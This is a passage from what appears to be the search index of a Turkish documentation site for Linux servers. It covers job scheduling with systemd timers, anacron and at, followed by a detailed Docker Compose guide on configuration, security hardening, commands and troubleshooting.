ba\u015flat/durdur\nsudo systemctl start mybackup.timer\nsudo systemctl stop mybackup.timer\n\n# Service'i manuel \u00e7al\u0131\u015ft\u0131r (test i\u00e7in)\nsudo systemctl start mybackup.service\n\n# Log'lar\u0131 kontrol et\njournalctl -u mybackup.service -n 50\njournalctl -u mybackup.timer -f  # Canl\u0131 takip\n</code></pre> <p>Docker \u00d6rne\u011fi:</p> <pre><code># /etc/systemd/system/docker-refresh.service\n[Unit]\nDescription=Refresh Docker Container\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'docker stop myapp &amp;&amp; docker rm myapp &amp;&amp; docker run -d --name myapp nginx'\n\n# /etc/systemd/system/docker-refresh.timer\n[Unit]\nDescription=Refresh container every 30 minutes\n\n[Timer]\nOnCalendar=*:0/30  # Her 30 dakikada (saat ba\u015f\u0131 ve yar\u0131mda)\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n</code></pre>"},{"location":"how-to/cron/#b-anacron-kapal-bilgisayarlar-icin","title":"B. anacron (Kapal\u0131 Bilgisayarlar \u0130\u00e7in)","text":"<p>Ubuntu sistemlerinde varsay\u0131lan olarak gelir. S\u00fcrekli a\u00e7\u0131k olmayan bilgisayarlar i\u00e7in tasarlanm\u0131\u015ft\u0131r.</p> <p>Fark\u0131: E\u011fer bilgisayar kapal\u0131yken bir g\u00f6rev \u00e7al\u0131\u015fmas\u0131 gerekiyorsa, a\u00e7\u0131ld\u0131\u011f\u0131nda o g\u00f6revi \u00e7al\u0131\u015ft\u0131r\u0131r. Cron ise o an\u0131 ka\u00e7\u0131r\u0131rsa g\u00f6revi atlar.</p> <p>Kullan\u0131m: \u00d6zellikle <code>/etc/cron.daily</code>, <code>/etc/cron.weekly</code>, <code>/etc/cron.monthly</code> klas\u00f6rlerindeki scriptleri y\u00f6netir.</p> <pre><code># anacron konfig\u00fcrasyonu\ncat /etc/anacrontab\n\n# \u00d6rnek \u00e7\u0131kt\u0131:\n# period  delay  job-identifier  command\n1         5      cron.daily      run-parts /etc/cron.daily\n7         10     cron.weekly     run-parts /etc/cron.weekly\n@monthly  15     cron.monthly    run-parts /etc/cron.monthly\n</code></pre> <p>\u00d6rnek Kullan\u0131m:</p> <pre><code># /etc/cron.daily/ klas\u00f6r\u00fcne script ekle\nsudo nano /etc/cron.daily/my-backup\n\n#!/bin/bash\ntar -czf /backup/daily-$(date +%Y%m%d).tar.gz /var/www\n\n# \u00c7al\u0131\u015ft\u0131r\u0131labilir yap\nsudo chmod +x /etc/cron.daily/my-backup\n</code></pre> <p>[!TIP] &gt; Ne Zaman Kullan\u0131l\u0131r: Laptop veya s\u00fcrekli a\u00e7\u0131k olmayan sunucular i\u00e7in idealdir. Desktop bilgisayarlarda g\u00fcnl\u00fck/haftal\u0131k bak\u0131m i\u015fleri i\u00e7in kullan\u0131l\u0131r.</p>"},{"location":"how-to/cron/#c-at-tek-seferlik-gorevler","title":"C. at (Tek Seferlik G\u00f6revler)","text":"<p>Tek seferlik g\u00f6revler i\u00e7in kullan\u0131l\u0131r. Cron gibi tekrarlamaz, sadece bir kez \u00e7al\u0131\u015f\u0131r.</p> <p>Kurulum:</p> <pre><code># at kurulu mu kontrol et\nwhich at\n\n# Kurulu de\u011filse:\nsudo apt update\nsudo apt install at\nsudo systemctl enable --now atd\n</code></pre> <p>Kullan\u0131m \u00d6rnekleri:</p> <pre><code># 10 dakika sonra Docker container \u00e7al\u0131\u015ft\u0131r\necho \"docker run -d nginx\" | at now + 10 minutes\n\n# Yar\u0131n saat 14:00'te backup al\necho \"tar -czf /backup/myapp-$(date +%Y%m%d).tar.gz /var/www/myapp\" | at 14:00 tomorrow\n\n# 2 saat sonra sistem bilgilerini dosyaya yaz\nat now + 2 hours &lt;&lt; EOF\ndf -h &gt; /tmp/disk-report.txt\ndocker ps &gt; /tmp/containers.txt\necho \"Rapor haz\u0131r\"\nEOF\n\n# Zamanlanm\u0131\u015f g\u00f6revleri listele\natq\n\n# Bir g\u00f6revi iptal et (\u00f6rn: job 5)\natrm 5\n\n# Bir g\u00f6revin detaylar\u0131n\u0131 g\u00f6r\nat -c 5\n</code></pre> <p>Zaman Formatlar\u0131:</p> Format A\u00e7\u0131klama <code>now + 30 minutes</code> 30 dakika sonra <code>now + 2 hours</code> 2 saat sonra <code>now + 3 days</code> 3 g\u00fcn sonra <code>14:30</code> Bug\u00fcn 14:30 <code>14:30 tomorrow</code> Yar\u0131n 14:30 <code>14:30 2026-01-25</code> Belirli tarih <p>Pratik \u00d6rnek:</p> <pre><code># 1 saat sonra backup al ve \u00e7\u0131kt\u0131y\u0131 logla\nat now + 1 hour &lt;&lt; 'END'\n/usr/local/bin/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1\nEND\n</code></pre>"},{"location":"how-to/cron/#8-hangisini-kullanmalym","title":"8. Hangisini Kullanmal\u0131y\u0131m? \ud83e\udd14","text":"Ara\u00e7 Kullan\u0131m Senaryosu \u00d6rnek Cron Basit, tekrarlayan g\u00f6revler Her gece 03:00'te yedek al Systemd Timers Karma\u015f\u0131k, ba\u011f\u0131ml\u0131l\u0131kl\u0131 g\u00f6revler Veritaban\u0131 ba\u015flad\u0131ktan 10 dakika sonra backup anacron S\u00fcrekli a\u00e7\u0131k olmayan sistemler Laptop'ta g\u00fcnl\u00fck bak\u0131m at Tek seferlik g\u00f6revler 2 saat sonra container yeniden ba\u015flat <p>\u00d6nerimiz:</p> <ul> <li>\ud83c\udfaf Yeni projeler i\u00e7in: Systemd Timers (modern, g\u00fc\u00e7l\u00fc)</li> <li>\ud83c\udfaf Basit i\u015fler i\u00e7in: Cron (h\u0131zl\u0131, kolay)</li> <li>\ud83c\udfaf Tek seferlik i\u015fler i\u00e7in: at</li> <li>\ud83c\udfaf Laptop/Desktop i\u00e7in: anacron</li> </ul>"},{"location":"how-to/docker-compose/","title":"Docker Compose Detayl\u0131 Rehber","text":"<p>Docker Compose, \u00e7oklu container uygulamalar\u0131n\u0131 tan\u0131mlamak ve \u00e7al\u0131\u015ft\u0131rmak i\u00e7in kullan\u0131lan g\u00fc\u00e7l\u00fc bir ara\u00e7t\u0131r. Bu rehber, temel kullan\u0131mdan production-grade konfig\u00fcrasyonlara kadar her \u015feyi kapsar.</p> <p>[!IMPORTANT] Docker Compose V1 vs V2:</p> <ul> <li>V1 (Eski): <code>docker-compose</code> (Python, deprecated) \u274c</li> <li>V2 (Yeni): <code>docker compose</code> (Go, Docker CLI plugin) \u2705</li> </ul> <p>Bu rehber Compose V2 syntax'\u0131n\u0131 kullan\u0131r. V1 art\u0131k deprecated, V2 kullan\u0131n!</p>"},{"location":"how-to/docker-compose/#1-docker-compose-nedir","title":"1. Docker Compose Nedir? \ud83e\udd14","text":"<p>K\u0131sa Cevap: Docker Compose, birden fazla container'\u0131 tek bir YAML dosyas\u0131yla y\u00f6netmenizi sa\u011flar.</p> <p>Uzun Cevap: Modern uygulamalar genellikle tek bir servisten olu\u015fmaz:</p> <ul> <li>Web uygulamas\u0131 (Frontend)</li> <li>API (Backend)</li> <li>Veritaban\u0131 (PostgreSQL, MySQL)</li> <li>Cache (Redis)</li> <li>Reverse Proxy (Nginx)</li> <li>Monitoring (Prometheus, Grafana)</li> </ul> <p>T\u00fcm bunlar\u0131 elle (<code>docker run ...</code>) y\u00f6netmek kabus olur. Compose, t\u00fcm bu servisleri tek bir dosyada tan\u0131mlaman\u0131z\u0131 ve tek bir komutla y\u00f6netmenizi sa\u011flar.</p>"},{"location":"how-to/docker-compose/#2-temel-yap-ve-syntax","title":"2. Temel Yap\u0131 ve Syntax \ud83d\udcdd","text":""},{"location":"how-to/docker-compose/#21-minimal-ornek","title":"2.1. Minimal \u00d6rnek","text":"<pre><code># Modern syntax (Compose V2+)\nservices:\n  web:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n</code></pre> <p>[!WARNING] <code>version:</code> Art\u0131k Obsolete! Docker Compose V2'de <code>version:</code> key'i tamamen g\u00f6rmezden geliniyor. Belirtmenize gerek yok, hatta Docker resmi olarak kald\u0131rman\u0131z\u0131 \u00f6neriyor.</p> <p>Bu kadar! <code>docker compose up -d</code> dedi\u011finizde Nginx aya\u011fa kalkar.</p>"},{"location":"how-to/docker-compose/#22-gercek-dunya-ornegi-full-stack-app","title":"2.2. Ger\u00e7ek D\u00fcnya \u00d6rne\u011fi (Full-Stack App)","text":"<pre><code># Modern syntax (version key yok)\n\nservices:\n  # Frontend (React/Next.js)\n  frontend:\n    build: ./frontend\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NEXT_PUBLIC_API_URL=http://backend:5000\n    depends_on:\n      - backend\n    restart: unless-stopped\n\n  # Backend (Node.js/Python/.NET)\n  backend:\n    build: ./backend\n    ports:\n      - \"5000:5000\"\n    environment:\n      - DATABASE_URL=postgresql://user:pass@db:5432/myapp\n      - REDIS_URL=redis://cache:6379\n    depends_on:\n      db:\n        condition: service_healthy\n      cache:\n        condition: service_started\n    volumes:\n      - ./backend/uploads:/app/uploads\n    restart: unless-stopped\n\n  # PostgreSQL Database\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: myapp\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U user\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n    restart: unless-stopped\n\n  # Redis Cache\n  cache:\n    image: redis:7-alpine\n    command: redis-server --appendonly yes\n    volumes:\n      - redis_data:/data\n    restart: unless-stopped\n\n  # Nginx Reverse Proxy\n  nginx:\n    image: nginx:alpine\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./nginx/ssl:/etc/nginx/ssl:ro\n    depends_on:\n      - frontend\n      - backend\n    restart: unless-stopped\n\nvolumes:\n  postgres_data:\n  redis_data:\n</code></pre>"},{"location":"how-to/docker-compose/#3-servis-tanmlama-services","title":"3. Servis Tan\u0131mlama (Services) \ud83d\udd27","text":""},{"location":"how-to/docker-compose/#31-image-vs-build","title":"3.1. Image vs Build","text":"<p>Haz\u0131r Image Kullanma:</p> <pre><code>services:\n  db:\n    image: postgres:16-alpine # Docker Hub'dan indir\n</code></pre> <p>Kendi Image'\u0131n\u0131z\u0131 Build Etme:</p> <pre><code>services:\n  api:\n    build:\n      context: ./backend # Dockerfile'\u0131n bulundu\u011fu klas\u00f6r\n      dockerfile: Dockerfile # Dockerfile ad\u0131 (varsay\u0131lan: Dockerfile)\n      args: # Build-time de\u011fi\u015fkenler\n        NODE_ENV: production\n      target: production # Multi-stage build'de hangi stage\n</code></pre> <p>\u0130leri Seviye Build:</p> <pre><code>services:\n  app:\n    build:\n      context: .\n      dockerfile: Dockerfile.prod\n      cache_from:\n        - myapp:latest\n      labels:\n        - \"com.example.version=1.0\"\n      shm_size: \"2gb\"\n</code></pre>"},{"location":"how-to/docker-compose/#32-ports-port-mapping","title":"3.2. Ports (Port Mapping)","text":"<pre><code>services:\n  web:\n    ports:\n      - \"8080:80\" # Host:Container\n      - \"443:443\"\n      - \"127.0.0.1:5432:5432\" # Sadece localhost'tan eri\u015filebilir\n</code></pre> <p>[!WARNING] G\u00fcvenlik Uyar\u0131s\u0131: <code>ports:</code> kullanmak container'\u0131 t\u00fcm d\u00fcnyaya a\u00e7ar (UFW bypass eder). Sadece localhost'tan eri\u015fim istiyorsan\u0131z: <code>127.0.0.1:8080:80</code></p> <p>Expose (Sadece Container'lar Aras\u0131):</p> <pre><code>services:\n  api:\n    expose:\n      - \"5000\" # Sadece di\u011fer container'lar eri\u015febilir, d\u0131\u015far\u0131ya a\u00e7\u0131k DE\u011e\u0130L\n</code></pre>"},{"location":"how-to/docker-compose/#33-environment-variables","title":"3.3. Environment Variables","text":"<p>Y\u00f6ntem 1: Do\u011frudan Tan\u0131mlama</p> <pre><code>services:\n  app:\n    environment:\n      - NODE_ENV=production\n      - DATABASE_URL=postgresql://user:pass@db:5432/myapp\n      - DEBUG=false\n</code></pre> <p>Y\u00f6ntem 2: .env Dosyas\u0131ndan Okuma</p> <pre><code>services:\n  app:\n    env_file:\n      - .env\n      - .env.production\n</code></pre> <p>Y\u00f6ntem 3: Host'tan De\u011fi\u015fken Ge\u00e7irme</p> <pre><code>services:\n  app:\n    environment:\n      - API_KEY=${API_KEY} # Host'taki $API_KEY de\u011fi\u015fkenini kullan\n</code></pre>"},{"location":"how-to/docker-compose/#34-volumes-veri-saklama","title":"3.4. Volumes (Veri Saklama)","text":"<p>Named Volumes (\u00d6nerilen - Production):</p> <pre><code>services:\n  db:\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n\nvolumes:\n  postgres_data: # Docker taraf\u0131ndan y\u00f6netilir\n</code></pre> <p>Bind Mounts (Development):</p> <pre><code>services:\n  app:\n    volumes:\n      - ./src:/app/src # Host'taki ./src -&gt; Container'daki /app/src\n      - ./config.yml:/app/config.yml:ro # Read-only\n</code></pre> <p>tmpfs (Ge\u00e7ici Veri):</p> <pre><code>services:\n  app:\n    tmpfs:\n      - /tmp\n      - /run\n</code></pre>"},{"location":"how-to/docker-compose/#35-networks-ag-yonetimi","title":"3.5. Networks (A\u011f Y\u00f6netimi)","text":"<p>Varsay\u0131lan Davran\u0131\u015f: Compose otomatik olarak t\u00fcm servisleri ayn\u0131 network'e koyar.</p> <p>\u00d6zel Network Tan\u0131mlama:</p> <pre><code>services:\n  frontend:\n    networks:\n      - frontend_net\n\n  backend:\n    networks:\n      - frontend_net\n      - backend_net\n\n  db:\n    networks:\n      - backend_net # Sadece backend eri\u015febilir\n\nnetworks:\n  frontend_net:\n  backend_net:\n</code></pre> <p>\u0130leri Seviye Network:</p> <pre><code>networks:\n  frontend_net:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 172.28.0.0/16\n\n  backend_net:\n    driver: bridge\n    internal: true # D\u0131\u015f d\u00fcnyaya kapal\u0131\n</code></pre>"},{"location":"how-to/docker-compose/#36-depends-on-baslatma-sras","title":"3.6. Depends On (Ba\u015flatma S\u0131ras\u0131)","text":"<p>Basit Ba\u011f\u0131ml\u0131l\u0131k:</p> <pre><code>services:\n  web:\n    depends_on:\n      - db\n      - cache\n</code></pre> <p>Health Check ile Ba\u011f\u0131ml\u0131l\u0131k (\u00d6nerilen):</p> <pre><code>services:\n  web:\n    depends_on:\n      db:\n        condition: service_healthy\n      cache:\n        condition: service_started\n\n  db:\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n</code></pre>"},{"location":"how-to/docker-compose/#37-restart-policies","title":"3.7. Restart Policies","text":"<pre><code>services:\n  app:\n    restart: unless-stopped # \u00d6nerilen (production)\n    # Di\u011fer se\u00e7enekler:\n    # restart: no              # Hi\u00e7bir zaman yeniden ba\u015flatma\n    # restart: always          # Her zaman yeniden ba\u015flat\n    # restart: on-failure      # Sadece hata durumunda\n</code></pre>"},{"location":"how-to/docker-compose/#38-resource-limits-kaynak-kstlama","title":"3.8. Resource Limits (Kaynak K\u0131s\u0131tlama)","text":"<pre><code>services:\n  app:\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.5\" # Maksimum 0.5 CPU\n          memory: 512M # Maksimum 512MB RAM\n        reservations:\n          cpus: \"0.25\" # Minimum 0.25 CPU\n          memory: 256M # Minimum 256MB RAM\n</code></pre>"},{"location":"how-to/docker-compose/#39-health-checks","title":"3.9. Health Checks","text":"<pre><code>services:\n  api:\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:5000/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n</code></pre> <p>\u00d6rnekler:</p> <pre><code># PostgreSQL\nhealthcheck:\n  test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n\n# MySQL\nhealthcheck:\n  test: [\"CMD\", \"mysqladmin\", \"ping\", \"-h\", \"localhost\"]\n\n# Redis\nhealthcheck:\n  test: [\"CMD\", \"redis-cli\", \"ping\"]\n\n# HTTP Endpoint\nhealthcheck:\n  test: [\"CMD\", \"wget\", \"--no-verbose\", \"--tries=1\", \"--spider\", \"http://localhost/health\"]\n</code></pre>"},{"location":"how-to/docker-compose/#4-production-best-practices","title":"4. Production Best Practices \ud83c\udfed","text":""},{"location":"how-to/docker-compose/#41-guvenlik","title":"4.1. G\u00fcvenlik","text":"<p>1. Secrets Kullan\u0131m\u0131:</p> <pre><code>services:\n  db:\n    secrets:\n      - db_password\n    environment:\n      POSTGRES_PASSWORD_FILE: /run/secrets/db_password\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n</code></pre> <p>2. Read-Only Root Filesystem:</p> <pre><code>services:\n  app:\n    read_only: true\n    tmpfs:\n      - /tmp\n      - /var/run\n</code></pre> <p>3. Non-Root User:</p> <pre><code>services:\n  app:\n    user: \"1000:1000\" # UID:GID\n</code></pre> <p>4. Security Options:</p> <pre><code>services:\n  app:\n    security_opt:\n      - no-new-privileges:true\n    cap_drop:\n      - ALL\n    cap_add:\n      - NET_BIND_SERVICE\n</code></pre>"},{"location":"how-to/docker-compose/#42-logging","title":"4.2. Logging","text":"<pre><code>services:\n  app:\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n        max-file: \"3\"\n        labels: \"production\"\n</code></pre> <p>Alternatif Drivers:</p> <pre><code>logging:\n  driver: \"syslog\"\n  options:\n    syslog-address: \"tcp://192.168.0.42:123\"\n</code></pre>"},{"location":"how-to/docker-compose/#43-override-pattern-environment-specific","title":"4.3. Override Pattern (Environment-Specific)","text":"<p>Base: <code>docker-compose.yml</code></p> <pre><code>services:\n  app:\n    build: .\n    environment:\n      - NODE_ENV=development\n</code></pre> <p>Production: <code>docker-compose.prod.yml</code></p> <pre><code>services:\n  app:\n    environment:\n      - NODE_ENV=production\n    restart: unless-stopped\n    deploy:\n      resources:\n        limits:\n          memory: 1G\n</code></pre> <p>Kullan\u0131m:</p> <pre><code># Development\ndocker compose up -d\n\n# Production\ndocker compose -f docker-compose.yml -f docker-compose.prod.yml up -d\n</code></pre>"},{"location":"how-to/docker-compose/#5-temel-komutlar","title":"5. Temel Komutlar \ud83c\udfae","text":""},{"location":"how-to/docker-compose/#51-baslatma-ve-durdurma","title":"5.1. Ba\u015flatma ve Durdurma","text":"<pre><code># T\u00fcm servisleri ba\u015flat (detached mode)\ndocker compose up -d\n\n# Belirli servisleri ba\u015flat\ndocker compose up -d web db\n\n# Rebuild ederek ba\u015flat\ndocker compose up -d --build\n\n# Servisleri durdur (container'lar\u0131 silmeden)\ndocker compose stop\n\n# Servisleri durdur ve container'lar\u0131 sil\ndocker compose down\n\n# Servisleri durdur, container + volume'leri sil\ndocker compose down -v\n\n# Servisleri durdur, container + image'leri sil\ndocker compose down --rmi all\n</code></pre>"},{"location":"how-to/docker-compose/#52-log-ve-monitoring","title":"5.2. Log ve Monitoring","text":"<pre><code># T\u00fcm servislerin loglar\u0131n\u0131 izle\ndocker compose logs -f\n\n# Belirli servisin loglar\u0131n\u0131 izle\ndocker compose logs -f web\n\n# Son 100 sat\u0131r\u0131 g\u00f6ster\ndocker compose logs --tail=100\n\n# Kaynak kullan\u0131m\u0131n\u0131 izle (sadece compose container'lar\u0131)\ndocker stats $(docker compose ps -q)\n\n# Process listesi\ndocker compose top\n</code></pre>"},{"location":"how-to/docker-compose/#53-servis-yonetimi","title":"5.3. Servis Y\u00f6netimi","text":"<pre><code># \u00c7al\u0131\u015fan servisleri listele\ndocker compose ps\n\n# Servis detaylar\u0131n\u0131 g\u00f6ster\ndocker compose ps --services\n\n# Belirli servisi yeniden ba\u015flat\ndocker compose restart web\n\n# Servisi durdur\ndocker compose stop web\n\n# Servisi ba\u015flat\ndocker compose start web\n\n# Servisi scale et (\u00e7o\u011falt)\ndocker compose up -d --scale web=3\n</code></pre>"},{"location":"how-to/docker-compose/#54-exec-ve-shell","title":"5.4. Exec ve Shell","text":"<pre><code># Container i\u00e7inde komut \u00e7al\u0131\u015ft\u0131r\ndocker compose exec web sh\n\n# Root olarak gir\ndocker compose exec -u root web sh\n\n# Tek seferlik komut\ndocker compose exec db psql -U postgres\n\n# Yeni container ba\u015flat\u0131p komut \u00e7al\u0131\u015ft\u0131r\ndocker compose run --rm web npm install\n</code></pre>"},{"location":"how-to/docker-compose/#55-temizlik","title":"5.5. Temizlik","text":"<pre><code># Kullan\u0131lmayan container'lar\u0131 temizle\ndocker compose down --remove-orphans\n\n# T\u00fcm sistemi temizle\ndocker system prune -a --volumes\n</code></pre>"},{"location":"how-to/docker-compose/#6-gercek-dunya-ornekleri","title":"6. Ger\u00e7ek D\u00fcnya \u00d6rnekleri \ud83c\udf0d","text":"<p>[!TIP] Detayl\u0131 Production-Ready \u00d6rnekler: A\u015fa\u011f\u0131daki senaryolar i\u00e7in tam konfig\u00fcrasyon dosyalar\u0131 \u015eablonlar (Templates) b\u00f6l\u00fcm\u00fcnde bulunabilir:</p> <ul> <li>PostgreSQL (Production)</li> <li>MariaDB (Production)</li> <li>Redis (Production)</li> <li>Monitoring Stack (Prometheus + Grafana)</li> <li>Nginx Proxy Manager</li> <li>.NET Backend</li> </ul>"},{"location":"how-to/docker-compose/#61-basit-web-app-konsept","title":"6.1. Basit Web App (Konsept)","text":"<pre><code>services:\n  # Backend\n  api:\n    build: ./backend\n    environment:\n      - DATABASE_URL=postgresql://user:pass@db:5432/myapp\n    depends_on:\n      db:\n        condition: service_healthy\n    restart: unless-stopped\n\n  # Database\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_PASSWORD: ${DB_PASSWORD}\n    volumes:\n      - db_data:/var/lib/postgresql/data\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n\nvolumes:\n  db_data:\n</code></pre> <p>\u00d6nemli Noktalar:</p> <ul> <li>\u2705 <code>depends_on</code> ile service_healthy kullan\u0131m\u0131</li> <li>\u2705 Named volumes (production i\u00e7in)</li> <li>\u2705 Environment variables</li> <li>\u2705 Health checks</li> <li>\u2705 Restart policy</li> </ul>"},{"location":"how-to/docker-compose/#62-microservices-konsept","title":"6.2. Microservices (Konsept)","text":"<pre><code>services:\n  gateway:\n    build: ./gateway\n    ports:\n      - \"80:80\"\n    networks:\n      - frontend\n      - backend\n\n  service-a:\n    build: ./services/a\n    expose:\n      - \"5001\"\n    networks:\n      - backend # Sadece backend network'\u00fcnde\n\n  db:\n    image: postgres:16-alpine\n    networks:\n      - backend # D\u0131\u015f d\u00fcnyadan izole\n\nnetworks:\n  frontend:\n  backend:\n    internal: true # \u0130nternet eri\u015fimi yok\n</code></pre> <p>\u00d6nemli Noktalar:</p> <ul> <li>\u2705 Network izolasyonu (frontend vs backend)</li> <li>\u2705 <code>internal: true</code> ile g\u00fcvenlik</li> <li>\u2705 <code>expose</code> vs <code>ports</code> fark\u0131</li> <li>\u2705 Gateway pattern</li> </ul>"},{"location":"how-to/docker-compose/#63-development-vs-production","title":"6.3. Development vs Production","text":"<p>docker-compose.yml (Base):</p> <pre><code>services:\n  app:\n    build: .\n    volumes:\n      - ./src:/app/src\n</code></pre> <p>docker-compose.prod.yml (Override):</p> <pre><code>services:\n  app:\n    restart: unless-stopped\n    deploy:\n      resources:\n        limits:\n          memory: 1G\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n</code></pre> <p>Kullan\u0131m:</p> <pre><code># Development\ndocker compose up -d\n\n# Production\ndocker compose -f docker-compose.yml -f docker-compose.prod.yml up -d\n</code></pre> <p>[!NOTE] Tam Stack \u00d6rnekleri \u0130\u00e7in:</p> <ul> <li>MERN Stack \u2192 Monitoring Stack Template</li> <li>Microservices \u2192 Nginx Proxy Manager Template</li> <li>.NET + PostgreSQL \u2192 .NET Backend Template</li> </ul>"},{"location":"how-to/docker-compose/#7-troubleshooting","title":"7. Troubleshooting \ud83d\udd0d","text":""},{"location":"how-to/docker-compose/#71-yaygn-sorunlar","title":"7.1. Yayg\u0131n Sorunlar","text":"<p>Problem: Container aya\u011fa kalkm\u0131yor</p> <pre><code># Loglar\u0131 kontrol et\ndocker compose logs web\n\n# Container durumunu kontrol et\ndocker compose ps\n\n# Health check durumunu kontrol et\ndocker inspect &lt;container_id&gt; | grep -A 10 Health\n</code></pre> <p>Problem: Network ba\u011flant\u0131s\u0131 yok</p> <pre><code># Network'leri listele\ndocker network ls\n\n# Network detaylar\u0131n\u0131 incele\ndocker network inspect &lt;network_name&gt;\n\n# Container'\u0131n network'\u00fcn\u00fc kontrol et\ndocker inspect &lt;container_id&gt; | grep -A 20 Networks\n</code></pre> <p>Problem: Volume verisi kayboldu</p> <pre><code># Volume'leri listele\ndocker volume ls\n\n# Volume detaylar\u0131n\u0131 g\u00f6ster\ndocker volume inspect &lt;volume_name&gt;\n\n# Volume'\u00fc backup al\ndocker run --rm -v &lt;volume_name&gt;:/data -v $(pwd):/backup alpine tar czf /backup/backup.tar.gz /data\n</code></pre>"},{"location":"how-to/docker-compose/#72-debug-teknikleri","title":"7.2. Debug Teknikleri","text":"<p>1. Container i\u00e7ine gir:</p> <pre><code>docker compose exec web sh\n</code></pre> <p>2. Yeni container ba\u015flat:</p> <pre><code>docker compose run --rm web sh\n</code></pre> <p>3. Network connectivity test:</p> <pre><code>docker compose exec web ping db\ndocker compose exec web nc -zv db 5432\n</code></pre> <p>4. Environment variables kontrol:</p> <pre><code>docker compose exec web env\n</code></pre>"},{"location":"how-to/docker-compose/#8-ileri-seviye-konular","title":"8. \u0130leri Seviye Konular \ud83d\ude80","text":""},{"location":"how-to/docker-compose/#81-multi-stage-builds-ile-entegrasyon","title":"8.1. Multi-Stage Builds ile Entegrasyon","text":"<p>Dockerfile:</p> <pre><code>FROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\nFROM node:20-alpine AS production\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nCMD [\"node\", \"dist/index.js\"]\n</code></pre> <p>docker-compose.yml:</p> <pre><code>services:\n  app:\n    build:\n      context: .\n      target: production\n</code></pre>"},{"location":"how-to/docker-compose/#82-profiles-conditional-services","title":"8.2. Profiles (Conditional Services)","text":"<pre><code>services:\n  app:\n    image: myapp\n\n  db:\n    image: postgres:16-alpine\n\n  # Sadece debug modunda \u00e7al\u0131\u015fs\u0131n\n  debug-tools:\n    image: nicolaka/netshoot\n    profiles:\n      - debug\n    command: sleep infinity\n</code></pre> <p>Kullan\u0131m:</p> <pre><code># Normal mod (debug-tools \u00e7al\u0131\u015fmaz)\ndocker compose up -d\n\n# Debug mod (debug-tools da \u00e7al\u0131\u015f\u0131r)\ndocker compose --profile debug up -d\n</code></pre>"},{"location":"how-to/docker-compose/#83-extension-fields-dry-principle","title":"8.3. Extension Fields (DRY Principle)","text":"<pre><code>x-common-variables: &amp;common-env\n  NODE_ENV: production\n  LOG_LEVEL: info\n\nx-restart-policy: &amp;restart-policy\n  restart: unless-stopped\n\nservices:\n  web:\n    &lt;&lt;: *restart-policy\n    environment:\n      &lt;&lt;: *common-env\n      SERVICE_NAME: web\n\n  api:\n    &lt;&lt;: *restart-policy\n    environment:\n      &lt;&lt;: *common-env\n      SERVICE_NAME: api\n</code></pre>"},{"location":"how-to/docker-compose/#9-checklist-production-ready-compose","title":"9. Checklist: Production-Ready Compose \ud83d\udccb","text":"<ul> <li>[ ] Secrets y\u00f6netimi - \u015eifreler <code>.env</code> veya secrets ile</li> <li>[ ] Health checks - T\u00fcm kritik servislerde</li> <li>[ ] Resource limits - CPU/Memory limitleri tan\u0131ml\u0131</li> <li>[ ] Restart policy - <code>unless-stopped</code> veya <code>always</code></li> <li>[ ] Logging - Log rotation konfig\u00fcre edilmi\u015f</li> <li>[ ] Named volumes - Bind mount yerine named volume</li> <li>[ ] Network isolation - Gereksiz servislere eri\u015fim kapal\u0131</li> <li>[ ] Read-only filesystem - M\u00fcmk\u00fcnse <code>read_only: true</code></li> <li>[ ] Non-root user - Container'lar root olarak \u00e7al\u0131\u015fm\u0131yor</li> <li>[ ] Security options - <code>no-new-privileges</code>, cap_drop</li> <li>[ ] Backup stratejisi - Volume backup plan\u0131 var</li> <li>[ ] Monitoring - Health check ve log monitoring aktif</li> </ul>"},{"location":"how-to/docker-compose/#10-kaynaklar","title":"10. Kaynaklar \ud83d\udcda","text":"<ul> <li>Docker Compose Resmi Dok\u00fcmantasyon</li> <li>Compose File Reference</li> <li>Best Practices</li> </ul> <p>\ud83d\udca1 Pro Tip: Compose dosyan\u0131z\u0131 her zaman version control'e (Git) ekleyin, ancak <code>.env</code> dosyas\u0131n\u0131 asla commit etmeyin!</p>"},{"location":"how-to/docker/","title":"Docker Kurulumu ve Konfig\u00fcrasyonu","text":"<p>Sunucular\u0131m\u0131zda uygulamalar\u0131 izole etmek ve kolay y\u00f6netmek i\u00e7in Docker ve Docker Compose kullan\u0131yoruz.</p>"},{"location":"how-to/docker/#1-kurulum-resmi-yontem-production-grade","title":"1. Kurulum (Resmi Y\u00f6ntem - Production Grade) \ud83c\udfed","text":"<p>Prod\u00fcksiyon ortamlar\u0131 i\u00e7in en g\u00fcvenli ve g\u00fcncel y\u00f6ntem, Docker'\u0131n kendi <code>apt</code> deposunu kullanmakt\u0131r.</p>"},{"location":"how-to/docker/#11-kritik-guvenlik-uyars-firewall","title":"1.1. Kritik G\u00fcvenlik Uyar\u0131s\u0131 (Firewall) \ud83d\udee1\ufe0f","text":"<p>[!WARNING] &gt; Docker ve UFW 